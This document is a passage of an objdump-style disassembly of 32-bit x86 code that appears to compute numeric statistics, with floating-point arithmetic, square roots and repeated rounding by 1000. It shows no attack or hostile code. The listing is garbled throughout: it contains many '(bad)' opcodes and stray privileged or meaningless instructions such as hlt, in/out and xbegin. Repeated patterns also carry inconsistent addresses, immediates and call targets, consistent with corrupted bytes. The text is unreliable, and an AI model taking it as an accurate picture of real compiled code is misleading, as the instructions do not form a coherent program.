  4023d2:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  4023d5:	8b 79 04             	mov    0x4(%ecx),%edi
  4023d8:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  4023db:	8b 19                	mov    (%ecx),%ebx
  4023dd:	3b c7                	cmp    %edi,%eax
  4023df:	7c dc                	jl     0x4023bd
  4023e1:	7f 05                	jg     0x4023e8
  4023e3:	ce                   	into
  4023e4:	5d                   	pop    %ebp
  4023e5:	b0 72                	mov    $0x72,%al
  4023e7:	06                   	push   %es
  4023e8:	89 1d b0 89 7d b4    	mov    %ebx,0xb47d89b0
  4023ee:	8b 41 07             	mov    0x7(%ecx),%eax
  4023f1:	8b cc                	mov    %esp,%ecx
  4023f3:	08 39                	or     %bh,(%ecx)
  4023f5:	45                   	inc    %ebp
  4023f6:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4023f7:	7c 0d                	jl     0x402406
  4023f9:	7f 05                	jg     0x402400
  4023fb:	39 55 a0             	cmp    %edx,-0x60(%ebp)
  4023fe:	05 06 89 55 a0       	add    $0xa0558906,%eax
  402403:	89 45 a4             	mov    %eax,-0x5c(%ebp)
  402406:	2b ed                	sub    %ebp,%ebp
  402408:	1b c7                	sbb    %edi,%eax
  40240a:	8b bd 64 ff 76 ff    	mov    -0x89009c(%ebp),%edi
  402410:	3b f8                	cmp    %eax,%edi
  402412:	7c 16                	jl     0x40242a
  402414:	7f 08                	jg     0x40241e
  402416:	39 95 60 e9 11 ff    	cmp    %edx,-0xee16a0(%ebp)
  40241c:	ec                   	in     (%dx),%al
  40241d:	44                   	inc    %esp
  40241e:	89 95 a4 ff ff ff    	mov    %edx,-0x5c(%ebp)
  402424:	02 85 64 ff ff ff    	add    -0x9c(%ebp),%al
  40242a:	8b 79 dd             	mov    -0x23(%ecx),%edi
  40242d:	4a                   	dec    %edx
  40242e:	59                   	pop    %ecx
  40242f:	f8                   	clc
  402430:	39 7d d4             	cmp    %edi,-0x2c(%ebp)
  402433:	7c 13                	jl     0x402448
  402435:	7f 0a                	jg     0x402441
  402437:	23 4d d0             	and    -0x30(%ebp),%ecx
  40243a:	3b cb                	cmp    %ebx,%ecx
  40243c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40243f:	70 06                	jo     0x402447
  402441:	89 5d d0             	mov    %ebx,-0x30(%ebp)
  402444:	89 7d d4             	mov    %edi,-0x2c(%ebp)
  402447:	8b 9d 74 56 ff ff    	mov    -0xa98c(%ebp),%ebx
  40244d:	3b 59 04             	cmp    0x4(%ecx),%ebx
  402450:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  402451:	27                   	daa
  402452:	7c 0f                	jl     0x402463
  402454:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402457:	8b 9d 70 ff ff ff    	mov    -0x90(%ebp),%ebx
  40245d:	8b cb                	mov    %ebx,%ecx
  40245f:	3b d9                	cmp    %ecx,%ebx
  402461:	77 16                	ja     0x402479
  402463:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  402466:	8b 19                	mov    (%ecx),%ebx
  402468:	6f                   	outsl  %ds:(%esi),(%dx)
  402469:	9d                   	popf
  40246a:	27                   	daa
  40246b:	ff                   	(bad)
  40246c:	ff                   	(bad)
  40246d:	ff 8b 59 da 09 9d    	decl   -0x62f625a7(%ebx)
  402473:	74 ff                	je     0x402474
  402475:	ff 16                	call   *(%esi)
  402477:	eb 4c                	jmp    0x4024c5
  402479:	7b b1                	jnp    0x40242c
  40247b:	fc                   	cld
  40247c:	8b 49 0c             	mov    0xc(%ecx),%ecx
  40247f:	8b 5d bc             	mov    -0x44(%ebp),%ebx
  402482:	3b d9                	cmp    %ecx,%ebx
  402484:	41                   	inc    %ecx
  402485:	20 7c 0d cb          	and    %bh,-0x35(%ebp,%ecx,1)
  402489:	4d                   	dec    %ebp
  40248a:	fc                   	cld
  40248b:	8b 5d de             	mov    -0x22(%ebp),%ebx
  40248e:	8b 49 08             	mov    0x8(%ecx),%ecx
  402491:	f1                   	int1
  402492:	d9 09                	(bad) (%ecx)
  402494:	11 8b 4d fc 8b 59    	adc    %ecx,0x598bfc4d(%ebx)
  40249a:	08 89 33 b8 8b 59    	or     %cl,0x598bb833(%ecx)
  4024a0:	0c 89                	or     $0x89,%al
  4024a2:	5d                   	pop    %ebp
  4024a3:	bc eb a6 8b 35       	mov    $0x358ba6eb,%esp
  4024a8:	fc                   	cld
  4024a9:	39 85 6c ff ff 9d    	cmp    %eax,-0x62000094(%ebp)
  4024af:	7f 16                	jg     0x4024c7
  4024b1:	7c 08                	jl     0x4024bb
  4024b3:	39 95 68 ff ff 12    	cmp    %edx,0x12ffff68(%ebp)
  4024b9:	77 1c                	ja     0x4024d7
  4024bb:	89 95 68 22 ff ff    	mov    %edx,-0xdd98(%ebp)
  4024c1:	89 85 6c ff ff ff    	mov    %eax,-0x94(%ebp)
  4024c7:	39 7d 84             	cmp    %edi,-0x7c(%ebp)
  4024ca:	f2 18 7c 0d 8b       	repnz sbb %bh,-0x75(%ebp,%ecx,1)
  4024cf:	49                   	dec    %ecx
  4024d0:	f8                   	clc
  4024d1:	8b 5d bf             	mov    -0x41(%ebp),%ebx
  4024d4:	cd d9                	int    $0xd9
  4024d6:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4024d9:	77 09                	ja     0x4024e4
  4024db:	8b b6 f8 89 7d 84    	mov    -0x7b827608(%esi),%esi
  4024e1:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4024e2:	bc 80 f7 09 8b       	mov    $0x8b09f780,%esp
  4024e7:	5d                   	pop    %ebp
  4024e8:	c0 46 d9 8b          	rolb   $0x8b,-0x27(%esi)
  4024ec:	4d                   	dec    %ebp
  4024ed:	12 fa                	adc    %dl,%bh
  4024ef:	47                   	inc    %edi
  4024f0:	c0 d6 5d             	rcl    $0x5d,%dh
  4024f3:	c4 8b 49 04 1d d9    	les    -0x26e2fbb7(%ebx),%ecx
  4024f9:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4024fc:	89 5d c4             	mov    %ebx,-0x3c(%ebp)
  4024ff:	8b 5d c8             	mov    -0x38(%ebp),%ebx
  402502:	8b 49 08             	mov    0x8(%ecx),%ecx
  402505:	03 d9                	add    %ecx,%ebx
  402507:	34 bc                	xor    $0xbc,%al
  402509:	fc                   	cld
  40250a:	70 5d                	jo     0x402569
  40250c:	cc                   	int3
  40250d:	12 5d cc             	adc    -0x34(%ebp),%bl
  402510:	8b 49 0c             	mov    0xc(%ecx),%ecx
  402513:	13 d9                	adc    %ecx,%ebx
  402515:	e0 4d                	loopne 0x402564
  402517:	e0 03                	loopne 0x40251c
  402519:	ca 8b 55             	lret   $0x558b
  40251c:	e8 89 5d cc 8b       	call   0x8c0c82aa
  402521:	5d                   	pop    %ebp
  402522:	e4 94                	in     $0x94,%al
  402524:	4d                   	dec    %ebp
  402525:	e0 8b                	loopne 0x4024b2
  402527:	85 fc                	test   %edi,%esp
  402529:	13 d8                	adc    %eax,%ebx
  40252b:	2d 41 f8 89 bb       	sub    $0xbb89f841,%eax
  402530:	e4 8b                	in     $0x8b,%al
  402532:	c5 ec 03             	(bad)
  402535:	d0 8b 45 f4 89 55    	rorb   $1,0x5589f445(%ebx)
  40253b:	e8 13 9f 83 e1       	call   0xe1c3c453
  402540:	12 48 28             	adc    0x28(%eax),%cl
  402543:	5d                   	pop    %ebp
  402544:	e9 89 4d 45 e4       	jmp    0xe48572d2
  402549:	45                   	inc    %ebp
  40254a:	f4                   	hlt
  40254b:	0e                   	push   %cs
  40254c:	85 84 a2 ae ff a1 ac 	test   %eax,-0x535e0052(%edx,%eiz,4)
  402553:	02 41 c1             	add    -0x3f(%ecx),%al
  402556:	d8 8b da 8b 55 c4    	fmuls  -0x3baa7426(%ebx)
  40255c:	8b f8                	mov    %eax,%edi
  40255e:	8b fe                	mov    %esi,%edi
  402560:	c0 53 57 52          	rclb   $0x52,0x57(%ebx)
  402564:	50                   	push   %eax
  402565:	e8 8f 0d 00 00       	call   0x4032f9
  40256a:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  40256d:	55                   	push   %ebp
  40256e:	82 fc 41             	cmp    $0x41,%ah
  402571:	55                   	push   %ebp
  402572:	c8 53 57 51          	enter  $0x5753,$0x51
  402576:	52                   	push   %edx
  402577:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40257a:	e8 11 e1 00 00       	call   0x410690
  40257f:	8b 40 e0             	mov    -0x20(%eax),%eax
  402582:	89 ef                	mov    %ebp,%edi
  402584:	98                   	cwtl
  402585:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  402588:	eb 57                	jmp    0x4025e1
  40258a:	50                   	push   %eax
  40258b:	51                   	push   %ecx
  40258c:	89 ef                	mov    %ebp,%edi
  40258e:	9c                   	pushf
  40258f:	e8 fc 8f 00 0f       	call   0xf40b590
  402594:	bd ab 02 8b 55       	mov    $0x558b02ab,%ebp
  402599:	ec                   	in     (%dx),%al
  40259a:	89 b6 dc ef 45 e8    	mov    %esi,-0x17ba1024(%esi)
  4025a0:	53                   	push   %ebx
  4025a1:	6e                   	outsb  %ds:(%esi),(%dx)
  4025a2:	52                   	push   %edx
  4025a3:	50                   	push   %eax
  4025a4:	e8 e7 8f 5d 60       	call   0x609db590
  4025a9:	d4 45                	aam    $0x45
  4025ab:	c0 a1 ac 02 41 00 91 	shlb   $0x91,0x4102ac(%ecx)
  4025b2:	c0 fb 55             	sar    $0x55,%bl
  4025b5:	c4                   	(bad)
  4025b6:	d5 8e                	aad    $0x8e
  4025b8:	bd 00 00 24 df       	mov    $0xdf240000,%ebp
  4025bd:	6d                   	insl   (%dx),%es:(%edi)
  4025be:	ae                   	scas   %es:(%edi),%al
  4025bf:	8b 0d cd 0b 41 00    	mov    0x410bcd,%ecx
  4025c5:	dd 65 d8             	frstor -0x28(%ebp)
  4025c8:	df a4 f8 8d 41 10 8b 	fbld   -0x74efbe73(%eax,%edi,8)
  4025cf:	3f                   	aas
  4025d0:	ac                   	lods   %ds:(%esi),%al
  4025d1:	02 41 00             	add    0x0(%ecx),%al
  4025d4:	14 5d                	adc    $0x5d,%al
  4025d6:	e0 df                	loopne 0x4025b7
  4025d8:	6d                   	insl   (%dx),%es:(%edi)
  4025d9:	c8 dd 5d e8          	enter  $0x5ddd,$0xe8
  4025dd:	df 6d c0             	fildll -0x40(%ebp)
  4025e0:	dd ad f0 dd 85 d4    	(bad) -0x2b7a2210(%ebp)
  4025e6:	ff                   	(bad)
  4025e7:	ff 22                	jmp    *(%edx)
  4025e9:	dd 45 a8             	fldl   -0x58(%ebp)
  4025ec:	dd 45 88             	fldl   -0x78(%ebp)
  4025ef:	dd 45 90             	fldl   -0x70(%ebp)
  4025f2:	df 68 3a             	fildll 0x3a(%eax)
  4025f5:	dd 45 d8             	fldl   -0x28(%ebp)
  4025f8:	83 c0 20             	add    $0x20,%eax
  4025fb:	49                   	dec    %ecx
  4025fc:	d8 e9                	fsubr  %st(1),%st
  4025fe:	d9 5c 24 c9          	fstps  -0x37(%esp)
  402602:	de c6                	faddp  %st,%st(6)
  402604:	dd d8                	fstp   %st(0)
  402606:	df 68 66             	fildll 0x66(%eax)
  402609:	dd 45 e0             	fldl   -0x20(%ebp)
  40260c:	d8 e9                	fsubr  %st(1),%st
  40260e:	d9 c0                	fld    %st(0)
  402610:	d8 c9                	fmul   %st(1),%st
  402612:	de c6                	faddp  %st,%st(6)
  402614:	fa                   	cli
  402615:	80 d9 c9             	sbb    $0xc9,%cl
  402618:	d8 e1                	fsub   %st(1),%st
  40261a:	dc 65 e8             	fsubl  -0x18(%ebp)
  40261d:	d9 c9                	fxch   %st(1)
  40261f:	dd d8                	fstp   %st(0)
  402621:	d9 c0                	fld    %st(0)
  402623:	d8 c9                	fmul   %st(1),%st
  402625:	de f9                	fdivrp %st,%st(1)
  402627:	dd d8                	fstp   %st(0)
  402629:	8d 68 d8             	lea    -0x28(%eax),%ebp
  40262c:	dc 65 4e             	fsubl  0x4e(%ebp)
  40262f:	d9 c0                	fld    %st(0)
  402631:	94                   	xchg   %eax,%esp
  402632:	4f                   	dec    %edi
  402633:	de 1d dd d8 75 b9    	ficomps 0xb975d8dd
  402639:	dd 3e                	fnstsw (%esi)
  40263b:	90                   	nop
  40263c:	dd 5d a1             	fstpl  -0x5f(%ebp)
  40263f:	dd 5d 2d             	fstpl  0x2d(%ebp)
  402642:	eb 06                	jmp    0x40264a
  402644:	86 85 78 ff ff ff    	xchg   %al,-0x88(%ebp)
  40264a:	a1 ac 02 e7 00       	mov    0xe702ac,%eax
  40264f:	83 f8 01             	cmp    $0x1,%eax
  402652:	f3 15 55 6d ff 89    	repz adc $0x89ff6d55,%eax
  402658:	55                   	push   %ebp
  402659:	f4                   	hlt
  40265a:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40265d:	23 f9                	and    %ecx,%edi
  40265f:	d9 10                	fsts   (%eax)
  402661:	dd 9d 78 ff ff ff    	fstpl  -0x88(%ebp)
  402667:	eb 14                	jmp    0x40267d
  402669:	f8                   	clc
  40266a:	85 78 ff             	test   %edi,-0x1(%eax)
  40266d:	ff                   	(bad)
  40266e:	ff 00                	incl   (%eax)
  402670:	00 00                	add    %al,(%eax)
  402672:	00 4b bd             	add    %cl,-0x43(%ebx)
  402675:	7c 3c                	jl     0x4026b3
  402677:	ff                   	(bad)
  402678:	ff 4a 00             	decl   0x0(%edx)
  40267b:	00 00                	add    %al,(%eax)
  40267d:	83 f8 01             	cmp    $0x1,%eax
  402680:	dd d8                	fstp   %st(0)
  402682:	7e 13                	jle    0x402697
  402684:	8d 48 ff             	lea    -0x1(%eax),%ecx
  402687:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  40268a:	4d                   	dec    %ebp
  40268b:	e3 f4                	jecxz  0x402681
  40268d:	dc 7d a8             	fdivrl -0x58(%ebp)
  402690:	d9 fa                	fsqrt
  402692:	dd 5d a0             	fstpl  -0x60(%ebp)
  402695:	30 0e                	xor    %cl,(%esi)
  402697:	c7 45 a8 00 d5 00 8b 	movl   $0x8b00d500,-0x58(%ebp)
  40269e:	c7 45 87 00 00 00 00 	movl   $0x0,-0x79(%ebp)
  4026a5:	83 f8 01             	cmp    $0x1,%eax
  4026a8:	7e 13                	jle    0x4026bd
  4026aa:	8d 50 ff             	lea    -0x1(%eax),%edx
  4026ad:	89 55 f4             	mov    %edx,-0xc(%ebp)
  4026b0:	4e                   	dec    %esi
  4026b1:	45                   	inc    %ebp
  4026b2:	f4                   	hlt
  4026b3:	dc 7d 88             	fdivrl -0x78(%ebp)
  4026b6:	d9 fa                	fsqrt
  4026b8:	dd 5d 88             	fstpl  -0x78(%ebp)
  4026bb:	eb 0e                	jmp    0x4026cb
  4026bd:	c7 45 86 00 00 00 00 	movl   $0x0,-0x7a(%ebp)
  4026c4:	c7 45 1e 00 00 00 00 	movl   $0x0,0x1e(%ebp)
  4026cb:	83 f8 01             	cmp    $0x1,%eax
  4026ce:	7e ff                	jle    0x4026cf
  4026d0:	72 48                	jb     0x40271a
  4026d2:	ff 89 4d f4 db 45    	decl   0x45dbf44d(%ecx)
  4026d8:	f4                   	hlt
  4026d9:	dc 7d 90             	fdivrl -0x70(%ebp)
  4026dc:	d9 fa                	fsqrt
  4026de:	dd 5d 90             	fstpl  -0x70(%ebp)
  4026e1:	eb 0e                	jmp    0x4026f1
  4026e3:	c7 45 90 00 b2 d0 00 	movl   $0xd0b200,-0x70(%ebp)
  4026ea:	c7 45 74 00 aa 00 00 	movl   $0xaa00,0x74(%ebp)
  4026f1:	8b 15 b2 0b 41 ce    	mov    0xce410bb2,%edx
  4026f7:	68 3b 30 1f 00       	push   $0x1f303b
  4026fc:	6a c9                	push   $0xffffffc9
  4026fe:	50                   	push   %eax
  4026ff:	52                   	push   %edx
  402700:	ff 15 44 c1 40 00    	call   *0x40c144
  402706:	8b 3d ac 02 41 00    	mov    0x4102ac,%edi
  40270c:	83 c4 10             	add    $0x10,%esp
  40270f:	83 ff 01             	cmp    $0x1,%edi
  402712:	35 40 8b c7 25       	xor    $0x25c78b40,%eax
  402717:	01 2d 00 80 79 05    	add    %ebp,0x5798000
  40271d:	84 83 c8 fe 40 c5    	test   %al,-0x3abf0138(%ebx)
  402723:	30 8b c7 8b 24 b2    	xor    %cl,-0x4ddb7439(%ebx)
  402729:	0b 41 00             	or     0x0(%ecx),%eax
  40272c:	99                   	cltd
  40272d:	bb c2 77 9d 59       	mov    $0x599d77c2,%ebx
  402732:	dc c1                	fadd   %st,%st(1)
  402734:	e0 05                	loopne 0x40273b
  402736:	0a c3                	or     %bl,%al
  402738:	6a 02                	push   $0x2
  40273a:	8b 48 30             	mov    0x30(%eax),%ecx
  40273d:	8b 50 10             	mov    0x10(%eax),%edx
  402740:	bb ad 8b 50 34       	mov    $0x34508bad,%ebx
  402745:	13 50 14             	adc    0x14(%eax),%edx
  402748:	52                   	push   %edx
  402749:	f2 e8 41 8e 00 00    	bnd call 0x40b590
  40274f:	89 45 f0             	mov    %eax,-0x10(%ebp)
  402752:	eb 04                	jmp    0x402758
  402754:	8b c7                	mov    %edi,%eax
  402756:	8b 1d c8 0b 82 00    	mov    0x820bc8,%ebx
  40275c:	99                   	cltd
  40275d:	2b c2                	sub    %edx,%eax
  40275f:	d1 f8                	sar    $1,%eax
  402761:	c1 3e 05             	sarl   $0x5,(%esi)
  402764:	95                   	xchg   %eax,%ebp
  402765:	4c                   	dec    %esp
  402766:	18 f5                	sbb    %dh,%ch
  402768:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  40276b:	8b 54 18 14          	mov    0x14(%eax,%ebx,1),%edx
  40276f:	64 60                	fs pusha
  402771:	31 df                	xor    %ebx,%edi
  402773:	00 6a 20             	add    %ch,0x20(%edx)
  402776:	57                   	push   %edi
  402777:	53                   	push   %ebx
  402778:	89 55 f4             	mov    %edx,-0xc(%ebp)
  40277b:	ff 15 44 d3 40 e3    	call   *0xe340d344
  402781:	8b 4a ac             	mov    -0x54(%edx),%ecx
  402784:	02 41 b7             	add    -0x49(%ecx),%al
  402787:	83 c4 b6             	add    $0xffffffb6,%esp
  40278a:	83 ff 01             	cmp    $0x1,%edi
  40278d:	c6                   	(bad)
  40278e:	4f                   	dec    %edi
  40278f:	8b c7                	mov    %edi,%eax
  402791:	25 01 00 68 73       	and    $0x73680001,%eax
  402796:	79 05                	jns    0x40279d
  402798:	48                   	dec    %eax
  402799:	83 c8 fe             	or     $0xfffffffe,%eax
  40279c:	40                   	inc    %eax
  40279d:	74 3f                	je     0x4027de
  40279f:	8b 6b a6             	mov    -0x5a(%ebx),%ebp
  4027a2:	1d c8 0b 41 00       	sbb    $0x410bc8,%eax
  4027a7:	99                   	cltd
  4027a8:	2b c2                	sub    %edx,%eax
  4027aa:	30 00                	xor    %al,(%eax)
  4027ac:	5c                   	pop    %esp
  4027ad:	f8                   	clc
  4027ae:	c1 e0 05             	shl    $0x5,%eax
  4027b1:	03 c3                	add    %ebx,%eax
  4027b3:	6a 58                	push   $0x58
  4027b5:	8b 48 38             	mov    0x38(%eax),%ecx
  4027b8:	8b a0 d2 2b ca 5b    	mov    0x5bca2bd2(%eax),%esp
  4027be:	50                   	push   %eax
  4027bf:	3c 9c                	cmp    $0x9c,%al
  4027c1:	50                   	push   %eax
  4027c2:	34 2b                	xor    $0x2b,%al
  4027c4:	48                   	dec    %eax
  4027c5:	10 1b                	adc    %bl,(%ebx)
  4027c7:	50                   	push   %eax
  4027c8:	14 b1                	adc    $0xb1,%al
  4027ca:	48                   	dec    %eax
  4027cb:	18 13                	sbb    %dl,(%ebx)
  4027cd:	50                   	push   %eax
  4027ce:	1c 52                	sbb    $0x52,%al
  4027d0:	51                   	push   %ecx
  4027d1:	e8 ba 8d 7c 00       	call   0xbcb590
  4027d6:	89 23                	mov    %esp,(%ebx)
  4027d8:	e8 89 55 35 eb       	call   0xeb757d66
  4027dd:	34 8b                	xor    $0x8b,%al
  4027df:	c7 38 1d c8 18       	xbegin 0x1908451c,(bad)
  4027e4:	41                   	inc    %ecx
  4027e5:	00 61 2b             	add    %ah,0x2b(%ecx)
  4027e8:	c2 d1 f8             	ret    $0xf8d1
  4027eb:	c1 e0 05             	shl    $0x5,%eax
  4027ee:	03 c3                	add    %ebx,%eax
  4027f0:	8b 48 18             	mov    0x18(%eax),%ecx
  4027f3:	8b 50 10             	mov    0x10(%eax),%edx
  4027f6:	2b ca                	sub    %edx,%ecx
  4027f8:	8b 50 14             	mov    0x14(%eax),%edx
  4027fb:	89 4d e8             	mov    %ecx,-0x18(%ebp)
  4027fe:	8b 65 1c             	mov    0x1c(%ebp),%esp
  402801:	1b ca                	sbb    %edx,%ecx
  402803:	89 4d d1             	mov    %ecx,-0x2f(%ebp)
  402806:	68 c0 28 40 b3       	push   $0xb34028c0
  40280b:	6a 61                	push   $0x61
  40280d:	57                   	push   %edi
  40280e:	53                   	push   %ebx
  40280f:	ff 81 85 c1 6f 00    	incl   0x6fc185(%ecx)
  402815:	8b 3d ac 02 b9 00    	mov    0xb902ac,%edi
  40281b:	83 c4 e2             	add    $0xffffffe2,%esp
  40281e:	83 ff 05             	cmp    $0x5,%edi
  402821:	7e f2                	jle    0x402815
  402823:	8b c7                	mov    %edi,%eax
  402825:	25 01 00 2b 80       	and    $0x802b0001,%eax
  40282a:	1e                   	push   %ds
  40282b:	05 48 83 c8 fe       	add    $0xfec88348,%eax
  402830:	40                   	inc    %eax
  402831:	74 30                	je     0x402863
  402833:	8b c7                	mov    %edi,%eax
  402835:	8b 1d df 0b 49 00    	mov    0x490bdf,%ebx
  40283b:	99                   	cltd
  40283c:	2b c2                	sub    %edx,%eax
  40283e:	6a 3f                	push   $0x3f
  402840:	9e                   	sahf
  402841:	f8                   	clc
  402842:	c1 e0 05             	shl    $0x5,%eax
  402845:	03 31                	add    (%ecx),%esi
  402847:	6a 02                	push   $0x2
  402849:	8b 48 57             	mov    0x57(%eax),%ecx
  40284c:	8b 9e 08 03 ca 8b    	mov    -0x7435fcf8(%esi),%ebx
  402852:	50                   	push   %eax
  402853:	2c 13                	sub    $0x13,%al
  402855:	5b                   	pop    %ebx
  402856:	be 52 67 80 32       	mov    $0x32806752,%esi
  40285b:	8d 00                	lea    (%eax),%eax
  40285d:	00 89 45 e0 62 1b    	add    %cl,0x1b62e045(%ecx)
  402863:	8b c7                	mov    %edi,%eax
  402865:	8b 1d c8 b4 41 00    	mov    0x41b4c8,%ebx
  40286b:	27                   	daa
  40286c:	2b c2                	sub    %edx,%eax
  40286e:	d1 f8                	sar    $1,%eax
  402870:	c1 e0 05             	shl    $0x5,%eax
  402873:	8b 4c f9 08          	mov    0x8(%ecx,%edi,8),%ecx
  402877:	8d 6b e0             	lea    -0x20(%ebx),%ebp
  40287a:	8b 54 18 f6          	mov    -0xa(%eax,%ebx,1),%edx
  40287e:	41                   	inc    %ecx
  40287f:	20 31                	and    %dh,(%ecx)
  402881:	40                   	inc    %eax
  402882:	00 6a 20             	add    %ch,0x20(%edx)
  402885:	57                   	push   %edi
  402886:	4c                   	dec    %esp
  402887:	79 f7                	jns    0x402880
  402889:	e4 ff                	in     $0xff,%al
  40288b:	15 7f 53 40 00       	adc    $0x40537f,%eax
  402890:	a1 ac 02 41 00       	mov    0x4102ac,%eax
  402895:	83 30 10             	xorl   $0x10,(%eax)
  402898:	83 f8 f7             	cmp    $0xfffffff7,%eax
  40289b:	7e 42                	jle    0x4028df
  40289d:	8b c8                	mov    %eax,%ecx
  40289f:	81 e1 01 00 00 49    	and    $0x49000001,%ecx
  4028a5:	79 9c                	jns    0x402843
  4028a7:	49                   	dec    %ecx
  4028a8:	83 c9 fe             	or     $0xfffffffe,%ecx
  4028ab:	41                   	inc    %ecx
  4028ac:	82 31 99             	xorb   $0x99,(%ecx)
  4028af:	2b c2                	sub    %edx,%eax
  4028b1:	8b 15 1a 0b 2c 00    	mov    0x2c0b1a,%edx
  4028b7:	d1 f8                	sar    $1,%eax
  4028b9:	51                   	push   %ecx
  4028ba:	e0 05                	loopne 0x4028c1
  4028bc:	c5 c2 6a             	(bad)
  4028bf:	00 6a 54             	add    %ch,0x54(%edx)
  4028c2:	8b 4f 38             	mov    0x38(%edi),%ecx
  4028c5:	8b 58 18             	mov    0x18(%eax),%ebx
  4028c8:	8b 50 2f             	mov    0x2f(%eax),%edx
  4028cb:	ab                   	stos   %eax,%es:(%edi)
  4028cc:	78 1c                	js     0x4028ea
  4028ce:	03 7a 71             	add    0x71(%edx),%edi
  4028d1:	d7                   	xlat   %ds:(%ebx)
  4028d2:	52                   	push   %edx
  4028d3:	de e8                	fsubrp %st,%st(0)
  4028d5:	b7 78                	mov    $0x78,%bh
  4028d7:	00 00                	add    %al,(%eax)
  4028d9:	8b f8                	mov    %eax,%edi
  4028db:	8b da                	mov    %edx,%ebx
  4028dd:	eb 17                	jmp    0x4028f6
  4028df:	3e f1                	ds int1
  4028e1:	c2 d2 c8             	ret    $0xc8d2
  4028e4:	a1 c8 0b 41 00       	mov    0x410bc8,%eax
  4028e9:	79 f9                	jns    0x4028e4
  4028eb:	c1 e1 05             	shl    $0x5,%ecx
  4028ee:	8b 7c 01 29          	mov    0x29(%ecx,%eax,1),%edi
  4028f2:	8b 28                	mov    (%eax),%ebp
  4028f4:	01 a3 68 38 dc 40    	add    %esp,0x40dc3868(%ebx)
  4028fa:	00 ff                	add    %bh,%bh
  4028fc:	d6                   	salc
  4028fd:	8b 45 68             	mov    0x68(%ebp),%eax
  402900:	c6                   	(bad)
  402901:	4d                   	dec    %ebp
  402902:	b4 8a                	mov    $0x8a,%ah
  402904:	c4 04 05 f4 01 c2 72 	les    0x72c201f4(,%eax,1),%eax
  40290b:	83 d1 d5             	adc    $0xffffffd5,%ecx
  40290e:	6a 00                	push   $0x0
  402910:	68 e8 03 b7 00       	push   $0xb703e8
  402915:	51                   	push   %ecx
  402916:	50                   	push   %eax
  402917:	e8 74 8c 00 5c       	call   0x5c40b590
  40291c:	8b 4d a4             	mov    -0x5c(%ebp),%ecx
  40291f:	89 45 4c             	mov    %eax,0x4c(%ebp)
  402922:	94                   	xchg   %eax,%esp
  402923:	45                   	inc    %ebp
  402924:	a0 6a 00 05 f4       	mov    0xf405006a,%al
  402929:	01 00                	add    %eax,(%eax)
  40292b:	00 68 e8             	add    %ch,-0x18(%eax)
  40292e:	03 00                	add    (%eax),%eax
  402930:	00 83 d1 e3 89 55    	add    %al,0x5589e3d1(%ebx)
  402936:	b4 51                	mov    $0x51,%ah
  402938:	50                   	push   %eax
  402939:	e8 52 8c 00 00       	call   0x40b590
  40293e:	8b 4d c5             	mov    -0x3b(%ebp),%ecx
  402941:	89 45 a0             	mov    %eax,-0x60(%ebp)
  402944:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402947:	6a 3d                	push   $0x3d
  402949:	05 f4 01 00 00       	add    $0x1f4,%eax
  40294e:	68 e8 03 00 00       	push   $0x3e8
  402953:	83 11 13             	adcl   $0x13,(%ecx)
  402956:	89 09                	mov    %ecx,(%ecx)
  402958:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  402959:	51                   	push   %ecx
  40295a:	50                   	push   %eax
  40295b:	e8 30 c3 00 00       	call   0x40ec90
  402960:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  402963:	89 16                	mov    %edx,(%esi)
  402965:	a8 13                	test   $0x13,%al
  402967:	f4                   	hlt
  402968:	c8 6a 00 05          	enter  $0x6a,$0x5
  40296c:	f4                   	hlt
  40296d:	01 00                	add    %eax,(%eax)
  40296f:	00 7a e8             	add    %bh,-0x18(%edx)
  402972:	03 00                	add    (%eax),%eax
  402974:	80 83 d1 00 89 55 fc 	addb   $0xfc,0x558900d1(%ebx)
  40297b:	51                   	push   %ecx
  40297c:	09 e8                	or     %ebp,%eax
  40297e:	0e                   	push   %cs
  40297f:	8c 1e                	mov    %ds,(%esi)
  402981:	00 8b 4d 73 89 87    	add    %cl,-0x78768cb3(%ebx)
  402987:	c8 8b 1a 72          	enter  $0x1a8b,$0x72
  40298b:	6a 00                	push   $0x0
  40298d:	05 f4 01 87 18       	add    $0x188701f4,%eax
  402992:	68 e8 03 00 00       	push   $0x3e8
  402997:	83 d1 00             	adc    $0x0,%ecx
  40299a:	89 55 cc             	mov    %edx,-0x34(%ebp)
  40299d:	51                   	push   %ecx
  40299e:	50                   	push   %eax
  40299f:	e8 ec 53 00 00       	call   0x407d90
  4029a4:	8b 6d 9c             	mov    -0x64(%ebp),%ebp
  4029a7:	89 45 c0             	mov    %eax,-0x40(%ebp)
  4029aa:	8b 45 98             	mov    -0x68(%ebp),%eax
  4029ad:	6a 35                	push   $0x35
  4029af:	05 f4 01 00 00       	add    $0x1f4,%eax
  4029b4:	68 e8 03 00 54       	push   $0x540003e8
  4029b9:	83 d1 00             	adc    $0x0,%ecx
  4029bc:	89 55 c4             	mov    %edx,-0x3c(%ebp)
  4029bf:	51                   	push   %ecx
  4029c0:	c8 e8 ca 8b          	enter  $0xcae8,$0x8b
  4029c4:	00 00                	add    %al,(%eax)
  4029c6:	3d 4d f4 89 45       	cmp    $0x4589f44d,%eax
  4029cb:	98                   	cwtl
  4029cc:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4029cf:	6a 00                	push   $0x0
  4029d1:	05 f4 01 00 00       	add    $0x1f4,%eax
  4029d6:	68 e8 cd 00 86       	push   $0x8600cde8
  4029db:	83 d1 00             	adc    $0x0,%ecx
  4029de:	5c                   	pop    %esp
  4029df:	32 72 51             	xor    0x51(%edx),%dh
  4029e2:	50                   	push   %eax
  4029e3:	e8 d7 8b 00 00       	call   0x40b5bf
  4029e8:	89 45 f0             	mov    %eax,-0x10(%ebp)
